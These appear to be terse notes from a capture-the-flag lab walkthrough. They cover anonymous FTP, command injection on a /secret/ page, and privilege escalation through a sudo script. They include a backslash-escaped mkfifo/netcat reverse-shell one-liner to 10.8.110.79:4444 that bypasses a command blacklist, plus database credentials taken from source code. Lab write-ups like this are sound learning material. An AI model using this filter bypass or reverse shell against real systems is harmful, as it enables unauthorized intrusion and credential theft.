21 ftp anon login allowed -> get note.txt  Anurodh  Apaar
22 ssh
80 http

/secret/ allows command executing

l\s -al
c\at index.php -> a blacklist cmd

r\m /tmp/f;mkfifo /tmp/f;ca\t /tmp/f|/bin/s\h -i 2>&1|n\c 10.8.110.79 4444 >/tmp/f (using \ to bypass cmd injection)

-> get rev shell

3 users:

only apaar can access to 
apaar sudo: .helpline
	requires 2 input: $user and $cmd
	$cmd move directly to /dev/null -> might be use to escalate to apaar user
	type in /bin/bash -> escalated to apaar user


check /var/www/files/index.php we can find a mysql database: ew PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");

mysql -u root -p webportal
password !@m+her00+@db
	get anurodh password: masterpassword